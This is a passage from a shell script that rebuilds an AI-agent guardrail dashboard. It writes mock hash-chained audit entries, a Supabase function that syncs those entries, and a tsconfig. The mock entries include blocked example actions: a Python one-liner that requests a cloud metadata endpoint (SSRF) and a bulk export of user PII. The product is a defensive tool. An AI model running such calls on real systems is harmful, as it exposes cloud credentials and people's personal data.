      prevHash: "sha256_1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b",
      issuer: "LangGraph-Worker v1.0",
      subject: "agent-code-interpreter",
      action: "exec:python -c 'import pandas as pd; df = pd.read_csv(\"sales_Q1.csv\"); print(df.summary())'",
      decision: "allow",
      reason: "Policy match: Sandboxed Python script execution verified [allow: exec:python]",
      occurredAt: new Date(now - 5 * hour),
    },
    {
      entryHash: "sha256_3c2d1e0f9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2d",
      prevHash: "sha256_8f9e0d1c2b3a4f5e6d7c8b9a0f1e2d3c4b5a6f7e8d9c0b1a2f3e4d5c6b7a8f9e",
      issuer: "CrewAI-Financial-Agent v2.1",
      subject: "agent-payout-controller",
      action: "stripe:create_payout(amount_usd=320.00, recipient='ven_1104x')",
      decision: "allow",
      reason: "Policy match: Payout under $1,000 threshold auto-approved [allow: stripe:create_payout max_amount_usd: 1000]",
      occurredAt: new Date(now - 8 * hour),
    },
    {
      entryHash: "sha256_5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f",
      prevHash: "sha256_3c2d1e0f9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2d",
      issuer: "AutoGPT-Core v0.4.5",
      subject: "agent-db-migrator",
      action: "postgres:select(query='SELECT COUNT(*) FROM orders WHERE status = \"pending\"')",
      decision: "allow",
      reason: "Policy match: Read-only query on whitelisted table [allow: postgres:select tables: [orders]]",
      occurredAt: new Date(now - 14 * hour),
    },
    {
      entryHash: "sha256_9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b",
      prevHash: "sha256_5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f",
      issuer: "Delgard-Agent-Guard CLI",
      subject: "agent-customer-support",
      action: "api:export_all_users(format='csv', include_pii=True)",
      decision: "block",
      reason: "Policy violation: Data exfiltration guardrail triggered [block: api:export_all_users]",
      occurredAt: new Date(now - 1 * day - 2 * hour),
    },
    {
      entryHash: "sha256_2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a",
      prevHash: "sha256_9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b",
      issuer: "LangChain-Orchestrator v0.3",
      subject: "agent-code-interpreter",
      action: "exec:python -c 'import urllib.request; urllib.request.urlopen(\"http://internal-metadata/latest\")'",
      decision: "block",
      reason: "Policy violation: Cloud metadata SSRF attempt intercepted by Delgard runtime hook",
      occurredAt: new Date(now - 2 * day - 6 * hour),
    },
    {
      entryHash: "sha256_4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c",
      prevHash: "sha256_2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a",
      issuer: "CrewAI-Financial-Agent v2.1",
      subject: "agent-payout-controller",
      action: "stripe:create_payout(amount_usd=12500.00, recipient='ven_vip_corp')",
      decision: "approval-required",
      reason: "Requires approval: Payout exceeds $1,000 threshold ($12,500.00 requested)",
      occurredAt: new Date(now - 4 * day - 3 * hour),
    },
    {
      entryHash: "sha256_6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e",
      prevHash: "sha256_4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c",
      issuer: "Delgard-Agent-Guard CLI",
      subject: "agent-customer-support",
      action: "api:send_email(to='customer@tech-startup.io', subject='Ticket #889 Resolved')",
      decision: "allow",
      reason: "Policy match: Outbound transactional email allowed",
      occurredAt: new Date(now - 8 * day), // Note: Older than 7 days! Will test Free plan truncation vs Pro plan full view!
    },
    {
      entryHash: "sha256_0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c",
      prevHash: "sha256_6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e",
      issuer: "AutoGPT-Core v0.4.5",
      subject: "agent-db-migrator",
      action: "postgres:select(query='SELECT version()')",
      decision: "allow",
      reason: "Policy match: System diagnosis query permitted",
      occurredAt: new Date(now - 12 * day),
    },
  ];
}
DELGARD_FILE_EOF_9f3a2b

mkdir -p "supabase/functions/sync-audit"
cat > "supabase/functions/sync-audit/index.ts" << 'DELGARD_FILE_EOF_9f3a2b'
// Supabase Edge Function: POST /sync-audit
// Deploy command: supabase functions deploy sync-audit --no-verify-jwt
// Or in Supabase Dashboard: Functions -> Create function "sync-audit" and paste this code.

// @ts-ignore: Deno URL import
import { createClient } from "https://esm.sh/@supabase/supabase-js@2.39.8";

declare const Deno: any;

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
};

// Helper function to hash API key using Web Crypto API (SHA-256)
async function hashApiKey(key: string): Promise<string> {
  const encoder = new TextEncoder();
  const data = encoder.encode(key);
  const hashBuffer = await crypto.subtle.digest("SHA-256", data);
  const hashArray = Array.from(new Uint8Array(hashBuffer));
  return hashArray.map((b) => b.toString(16).padStart(2, "0")).join("");
}

Deno.serve(async (req: Request) => {
  // Handle CORS preflight request
  if (req.method === "OPTIONS") {
    return new Response("ok", { headers: corsHeaders });
  }

  if (req.method !== "POST") {
    return new Response(JSON.stringify({ error: "Method not allowed. Use POST." }), {
      status: 405,
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  }

  try {
    // 1. Check for Authorization header (Authorization: Bearer <api_key>)
    const authHeader = req.headers.get("Authorization") || "";
    const match = authHeader.match(/^Bearer\s+(.+)$/i);

    if (!match || !match[1]) {
      return new Response(
        JSON.stringify({
          error: "Unauthorized: Missing or invalid Authorization header. Expected 'Bearer <your_api_key>'",
          code: "MISSING_API_KEY",
        }),
        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    const rawApiKey = match[1].trim();
    const keyHash = await hashApiKey(rawApiKey);

    // Initialize Supabase Admin Client using Service Role Key to query api_keys safely bypassing RLS
    const supabaseUrl = Deno.env.get("SUPABASE_URL") ?? "";
    const supabaseServiceKey = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY") ?? "";

    if (!supabaseUrl || !supabaseServiceKey) {
      return new Response(
        JSON.stringify({ error: "Server Configuration Error: Missing SUPABASE_URL or SUPABASE_SERVICE_ROLE_KEY" }),
        { status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    const supabaseAdmin = createClient(supabaseUrl, supabaseServiceKey);

    // 2. Verify key hash against api_keys table and get user_id
    const { data: apiKeyRecord, error: keyError } = await supabaseAdmin
      .from("api_keys")
      .select("id, user_id, label")
      .eq("key_hash", keyHash)
      .maybeSingle();

    if (keyError || !apiKeyRecord) {
      console.warn(`Attempted sync-audit with invalid key hash: ${keyHash.substring(0, 8)}...`);
      return new Response(
        JSON.stringify({
          error: "Unauthorized: Invalid API key. Please generate a valid key from your Delgard Dashboard.",
          code: "INVALID_API_KEY",
        }),
        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    const userId = apiKeyRecord.user_id;

    // Update last_used_at timestamp on the API key asynchronously
    await supabaseAdmin
      .from("api_keys")
      .update({ last_used_at: new Date().toISOString() })
      .eq("id", apiKeyRecord.id);

    // 3. Parse incoming body and validate audit entries array
    const body = await req.json();
    const entries = Array.isArray(body) ? body : Array.isArray(body.entries) ? body.entries : [body];

    if (!entries || entries.length === 0) {
      return new Response(
        JSON.stringify({ error: "Bad Request: No audit entries provided in request body." }),
        { status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    // Prepare rows for insertion into audit_entries (forcing user_id to match the API key owner)
    const recordsToInsert = await Promise.all(
      entries.map(async (entry: any) => ({
        user_id: userId,
        entry_hash: entry.entry_hash || entry.hash || await hashApiKey(JSON.stringify(entry) + Date.now()),
        prev_hash: entry.prev_hash || null,
        issuer: entry.issuer || "Delgard-CLI",
        subject: entry.subject || "agent-runtime",
        action: entry.action || "unknown",
        decision: entry.decision || "allow", // 'allow', 'block', or 'approval-required'
        reason: entry.reason || null,
        occurred_at: entry.occurred_at || new Date().toISOString(),
        received_at: new Date().toISOString(),
      }))
    );

    // 4. Insert into audit_entries table
    const { data: insertedData, error: insertError } = await supabaseAdmin
      .from("audit_entries")
      .insert(recordsToInsert)
      .select("id, decision, action, occurred_at");

    if (insertError) {
      console.error("Database insert error during audit sync:", insertError);
      return new Response(
        JSON.stringify({ error: "Failed to store audit entries.", details: insertError.message }),
        { status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    // Return success response with summary
    return new Response(
      JSON.stringify({
        success: true,
        synchronized_count: recordsToInsert.length,
        user_id: userId,
        api_key_label: apiKeyRecord.label || "Untitled Key",
        entries: insertedData,
      }),
      { status: 200, headers: { ...corsHeaders, "Content-Type": "application/json" } }
    );
  } catch (err: any) {
    return new Response(
      JSON.stringify({ error: "Internal Server Error", details: err.message }),
      { status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" } }
    );
  }
});
DELGARD_FILE_EOF_9f3a2b

cat > "tsconfig.json" << 'DELGARD_FILE_EOF_9f3a2b'
{
  "compilerOptions": {
    "target": "ES2017",
    "lib": [
      "dom",
      "dom.iterable",
      "esnext"
    ],
    "allowJs": false,
    "skipLibCheck": true,
    "strict": true,
    "noEmit": true,
    "esModuleInterop": true,
    "module": "esnext",
    "moduleResolution": "bundler",
    "resolveJsonModule": true,
    "isolatedModules": true,
    "jsx": "react-jsx",
    "incremental": true,
    "baseUrl": ".",
    "paths": {
      "@/*": [
        "./src/*"
      ]
    },
    "plugins": [
      {
        "name": "next"
      }
    ]
  },
  "include": [
    "next-env.d.ts",
    "**/*.ts",
    "**/*.tsx",
    ".next/types/**/*.ts",
    ".next/dev/types/**/*.ts"
  ],
  "exclude": [
    "node_modules",
    "supabase/**"
  ]
}
DELGARD_FILE_EOF_9f3a2b

echo "Projet delgard-dashboard recree avec succes dans /workspaces/delgard-dashboard"
